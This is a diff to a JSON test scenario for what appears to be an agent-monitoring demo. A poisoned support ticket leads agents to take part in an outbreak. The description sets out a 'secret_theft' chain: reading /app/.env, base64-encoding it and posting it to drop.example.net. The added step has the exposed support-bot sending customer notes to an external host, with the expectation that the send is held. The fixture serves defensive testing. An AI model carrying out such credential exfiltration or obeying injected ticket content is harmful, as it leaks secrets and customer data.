@@ -1,6 +1,6 @@
 {
   "name": "poisoned_ticket",
-  "description": "Outbreak scenario (master \u00a71 'Traces', demo act 3). support-bot reads the poisoned ticket:4821 and does normal tainted work (log read, docs http_get, internal status http_post: all ok). Then deploy-bot runs EXACTLY the five secret_theft steps (same ticket, /app/.env, base64, http_post drop.example.net, then a read that must be denied after the block). Expected outbreak for deploy-bot's incident: source_id ticket:4821, exposed_agents [support-bot], blocked_destinations [drop.example.net]; the checkpoint puts support-bot on heightened watch and denylists drop.example.net. The last step shows the heightened support-bot still working internally (expect any: internal posts are not held).",
+  "description": "Outbreak scenario (master \u00a71 'Traces', demo act 3). support-bot reads the poisoned ticket:4821 and does normal tainted work (log read, docs http_get, internal status http_post: all ok). Then deploy-bot runs EXACTLY the five secret_theft steps (same ticket, /app/.env, base64, http_post drop.example.net, then a read that must be denied after the block). Expected outbreak for deploy-bot's incident: source_id ticket:4821, exposed_agents [support-bot], blocked_destinations [drop.example.net]; the checkpoint puts support-bot on heightened watch and denylists drop.example.net. The last step shows the heightened support-bot still working internally (expect any: internal posts are not held). Final step: the heightened support-bot posts to a NEW external host (partner-sync.example.org) a few seconds after the block; a heightened agent's risky send is held even with global hold OFF, so the audience sees the exposed agent's next risky action denied (expect any: ok if the block has not landed yet).",
   "steps": [
     {
       "offset_ms": 0,
@@ -100,6 +100,16 @@
       "payload": "{\"ticket\":\"4821\",\"state\":\"escalated\"}",
       "tainted_by": "ticket:4821",
       "bytes": 0,
+      "expect": "any"
+    },
+    {
+      "offset_ms": 11900,
+      "agent_id": "support-bot",
+      "action": "http_post",
+      "target": "https://partner-sync.example.org/v1/export",
+      "payload": "{\"ticket\":\"4821\",\"export\":\"customer-notes\"}",
+      "tainted_by": "ticket:4821",
+      "bytes": 44,
       "expect": "any"
     }
   ]
